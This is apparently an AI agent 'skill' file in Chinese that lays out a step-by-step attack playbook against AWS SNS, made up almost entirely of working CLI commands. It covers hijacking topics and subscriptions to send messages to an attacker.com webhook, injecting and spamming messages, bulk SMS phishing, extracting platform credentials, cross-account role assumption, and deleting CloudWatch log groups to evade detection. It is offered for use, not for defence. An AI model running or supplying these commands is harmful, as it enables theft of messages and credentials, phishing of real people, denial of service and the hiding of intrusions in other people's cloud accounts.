---
name: aws-sns-attack
type: attack
category: messaging
platform: aws
severity: medium
---

# AWS SNS 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 SNS
- 用户要求"攻击 SNS"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有 Topic
aws sns list-topics

# 3. 列出所有订阅
aws sns list-subscriptions
```

## 攻击方法

### 方法 1: Topic 枚举

```bash
# 1. 列出所有 Topic
aws sns list-topics --query 'Topics[].TopicArn' --output text

# 2. 获取 Topic 属性
aws sns get-topic-attributes --topic-arn TOPIC_ARN

# 3. 搜索敏感 Topic
aws sns list-topics | grep -i -E "password|secret|sensitive|private"
```

### 方法 2: 消息窃取

```bash
# 1. 列出所有订阅
aws sns list-subscriptions --query 'Subscriptions[]' --output json

# 2. 检查订阅协议
# 如果有 HTTP/HTTPS 订阅，可以检查端点
aws sns list-subscriptions --query 'Subscriptions[?Protocol==`http` || Protocol==`https`].Endpoint' --output text

# 3. 如果有 Lambda 订阅
# 可以访问 Lambda 日志查看消息
```

### 方法 3: Topic 劫持

```bash
# 1. 获取 Topic 策略
aws sns get-topic-attributes --topic-arn TOPIC_ARN --query 'Attributes.Policy'

# 2. 如果有 AddPermission 权限，添加自己
aws sns add-permission \
  --topic-arn TOPIC_ARN \
  --label malicious-label \
  --aws-account-id YOUR_ACCOUNT_ID \
  --action-name Publish Subscribe Receive Delete

# 3. 订阅 Topic
aws sns subscribe \
  --topic-arn TOPIC_ARN \
  --protocol https \
  --notification-endpoint https://attacker.com/webhook
```

### 方法 4: 消息注入

```bash
# 1. 发布恶意消息
aws sns publish \
  --topic-arn TOPIC_ARN \
  --message "malicious_payload" \
  --subject "urgent"

# 2. 发布 JSON 消息
aws sns publish \
  --topic-arn TOPIC_ARN \
  --message '{"cmd": "malicious", "data": "exfiltrate"}' \
  --message-attributes "stringKey1={DataType=String,StringValue=value1}"

# 3. 批量发布
for i in {1..1000}; do
  aws sns publish --topic-arn TOPIC_ARN --message "spam_$i"
done
```

### 方法 5: 订阅劫持

```bash
# 1. 列出所有订阅
aws sns list-subscriptions --query 'Subscriptions[].SubscriptionArn' --output text

# 2. 获取订阅属性
aws sns get-subscription-attributes --subscription-arn SUBSCRIPTION_ARN

# 3. 修改订阅端点（如果有权限）
aws sns set-subscription-attributes \
  --subscription-arn SUBSCRIPTION_ARN \
  --attribute-name Endpoint \
  --attribute-value https://attacker.com/webhook

# 4. 删除订阅（DoS）
aws sns unsubscribe --subscription-arn SUBSCRIPTION_ARN
```

### 方法 6: 跨账户攻击

```bash
# 1. 检查 Topic 策略中的跨账户访问
aws sns get-topic-attributes --topic-arn TOPIC_ARN --query 'Attributes.Policy' | jq -r '.Statement[] | select(.Effect=="Allow") | .Principal.AWS'

# 2. 如果你的账户被授权，直接访问
aws sns publish --topic-arn CROSS_ACCOUNT_TOPIC_ARN --message "cross_account_attack"

# 3. 或通过 AssumeRole 跨账户
export ROLE_ARN="arn:aws:iam::TARGET_ACCOUNT:role/ROLE_NAME"
export TEMP_CREDS=$(aws sts assume-role --role-arn $ROLE_ARN --role-session-name attack)
export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.Credentials.SessionToken')
```

### 方法 7: Platform Application 利用

```bash
# 1. 列出平台应用
aws sns list-platform-applications

# 2. 获取应用属性
aws sns get-platform-application-attributes --platform-application-arn APP_ARN

# 3. 提取凭证
aws sns get-platform-application-attributes --platform-application-arn APP_ARN --query 'Attributes[]' --output json | grep -i "credential|key|secret"

# 4. 列出应用端点
aws sns list-endpoints-by-platform-application --platform-application-arn APP_ARN
```

### 方法 8: SMS 消息利用

```bash
# 1. 如果配置了 SMS
aws sns set-sms-attributes \
  --attributes DefaultSenderID=Attacker,MonthlySpendLimit=100

# 2. 发送 SMS（钓鱼攻击）
aws sns publish \
  --phone-number +1234567890 \
  --message "Urgent: Your account has been compromised. Click https://attacker.com/phishing"

# 3. 批量发送
for number in $(cat phone_numbers.txt); do
  aws sns publish --phone-number $number --message "phishing_message"
done
```

### 方法 9: Serverless 利用

```bash
# 1. 检查 Lambda 订阅
aws lambda list-event-source-mappings

# 2. 如果有 Lambda 订阅 SNS
# 消息会触发 Lambda，可能利用注入

# 3. 检查 SQS 订阅
aws sqs list-queues

# 4. 如果是 Fanout 架构
# 一个 Topic 订阅多个队列
```

### 方法 10: 日志和监控绕过

```bash
# 1. 检查是否启用 CloudWatch 日志
aws sns get-topic-attributes --topic-arn TOPIC_ARN --query 'Attributes.TracingConfig'

# 2. 禁用 Delivery Logging（如果有权限）
aws sns set-topic-attributes \
  --topic-arn TOPIC_ARN \
  --attribute-name TracingConfig \
  --attribute-value PassThrough

# 3. 删除日志
aws logs delete-log-group --log-group-name /aws/sns/TOPIC_NAME
```

## 验证成功

```bash
# 成功列出 Topic
aws sns list-topics

# 成功发布消息
aws sns publish --topic-arn TOPIC_ARN --message "test"

# 成功订阅 Topic
aws sns subscribe --topic-arn TOPIC_ARN --protocol email --notification-endpoint attacker@example.com
```

## 下一步

1. 分析窃取的消息内容
2. 通过 SNS 建立持久化通信通道
3. 攻击订阅的 Lambda/SQS
4. 通过 SMS 进行钓鱼攻击
